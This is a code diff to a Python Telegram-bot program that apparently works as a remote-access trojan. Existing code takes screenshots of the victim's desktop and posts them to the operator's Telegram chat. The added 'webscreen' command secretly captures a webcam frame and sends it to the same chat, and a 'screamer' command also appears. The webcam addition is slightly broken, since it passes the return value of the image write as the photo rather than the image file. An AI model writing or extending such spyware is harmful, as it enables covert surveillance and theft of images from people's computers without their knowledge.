@@ -1,4 +1,5 @@
 import telebot 
+import cv2
 import os 
 import requests 
 from PIL import ImageGrab 
@@ -38,6 +39,17 @@ def send_screen(command) :
     screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') 
     screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') 
     files = {'photo': screen} 
+    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 
+
+@bot.message_handler(commands=['webscreen', 'Webcreen']) 
+def send_webscreen(command) :
+    bot.send_message(chat_id, "Wait...") 
+    cap = cv2.VideoCapture(0)
+    for i in range(30):
+         cap.read()
+    ret, frame = cap.read()
+    file = cv2.imwrite('cam.png', frame)
+    files = {'photo': file } 
     requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 
 
 @bot.message_handler(commands=['screamer', 'Screamer']) 
